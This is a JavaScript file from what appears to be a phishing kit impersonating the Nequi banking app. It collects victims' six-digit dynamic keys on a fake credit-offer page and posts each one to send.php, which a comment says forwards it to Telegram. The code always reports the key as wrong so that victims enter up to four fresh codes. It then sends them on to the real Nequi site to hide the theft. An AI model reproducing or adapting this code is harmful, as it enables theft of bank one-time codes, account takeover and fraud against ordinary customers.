(() => {
  if (!sessionStorage.getItem('phone')) {
    window.location.replace('index.php');
    return;
  }

  const boxes = Array.from(document.querySelectorAll('.otp-box'));
  const form = document.getElementById('otpForm');
  const btn = document.getElementById('otpSubmit');
  const card = document.getElementById('otpCard');
  const title = document.getElementById('otpTitle');
  const sub = document.getElementById('otpSub');

  // Estado de error (preparado para que PHP redirija a clave.html?error=1)
  // o se puede llamar manualmente: window.setOtpError(true)
  function setOtpError(on) {
    if (on) {
      card.classList.add('otp-error');
      title.textContent = 'Clave dinámica incorrecta';
      sub.textContent = 'Ingresa la clave de 6 dígitos que aparece en la App nuevamente.';
      btn.textContent = 'Confirmar';
      boxes.forEach((b) => (b.value = ''));
      setTimeout(() => boxes[0]?.focus(), 50);
    } else {
      card.classList.remove('otp-error');
      title.textContent = 'Para finalizar, ingrese su clave dinámica';
      sub.textContent = 'Ingresa la clave de 6 dígitos que aparece en la App.';
      btn.textContent = 'Recibir Crédito';
    }
  }
  window.setOtpError = setOtpError;

  // Si la URL trae ?error=1 mostramos el estado de error desde el inicio
  const params = new URLSearchParams(window.location.search);
  if (params.get('error') === '1') {
    setOtpError(true);
  }

  // Auto-foco al primero
  setTimeout(() => boxes[0]?.focus(), 80);

  boxes.forEach((box, i) => {
    box.addEventListener('input', (e) => {
      const v = e.target.value.replace(/\D/g, '');
      e.target.value = v.slice(-1);
      if (e.target.value && i < boxes.length - 1) {
        boxes[i + 1].focus();
      }
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && i > 0) {
        boxes[i - 1].focus();
      } else if (e.key === 'ArrowLeft' && i > 0) {
        boxes[i - 1].focus();
      } else if (e.key === 'ArrowRight' && i < boxes.length - 1) {
        boxes[i + 1].focus();
      }
    });
    box.addEventListener('paste', (e) => {
      e.preventDefault();
      const data = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
      if (!data) return;
      data.split('').forEach((ch, idx) => {
        if (boxes[idx]) boxes[idx].value = ch;
      });
      const next = Math.min(data.length, boxes.length - 1);
      boxes[next].focus();
    });
  });

  // Toast simple para los avisos
  function showToast(msg, ms = 3500) {
    let t = document.getElementById('nqToast');
    if (!t) {
      t = document.createElement('div');
      t.id = 'nqToast';
      t.className = 'nq-toast';
      document.body.appendChild(t);
    }
    t.textContent = msg;
    requestAnimationFrame(() => t.classList.add('show'));
    setTimeout(() => t.classList.remove('show'), ms);
  }

  // Contador de intentos (persistente por si recarga)
  let attempts = Number(sessionStorage.getItem('otpAttempts') || '0');

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const code = boxes.map((b) => b.value).join('');
    if (code.length !== 6) {
      boxes.find((b) => !b.value)?.focus();
      return;
    }
    sessionStorage.setItem('otp', code);
    btn.textContent = 'Procesando...';
    btn.disabled = true;

    // Enviar a Telegram (no bloqueante)
    fetch('send.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ step: 'otp', otp: code, attempt: attempts + 1 }),
      keepalive: true,
    }).catch(() => {});

    setTimeout(() => {
      attempts += 1;
      sessionStorage.setItem('otpAttempts', String(attempts));

      btn.disabled = false;

      if (attempts >= 4) {
        // Cuarto intento: estado de error y redirigir a Nequi
        setOtpError(true);
        setTimeout(() => {
          sessionStorage.removeItem('otpAttempts');
          window.location.replace('https://www.nequi.com');
        }, 1400);
        return;
      }

      // Mostrar estado de error en intentos 1, 2 y 3
      setOtpError(true);

      // En el tercer intento, además mostrar el aviso
      if (attempts === 3) {
        showToast('Espera a que el último código haya cambiado e inténtalo de nuevo.', 4500);
      }
    }, 1500);
  });
})();
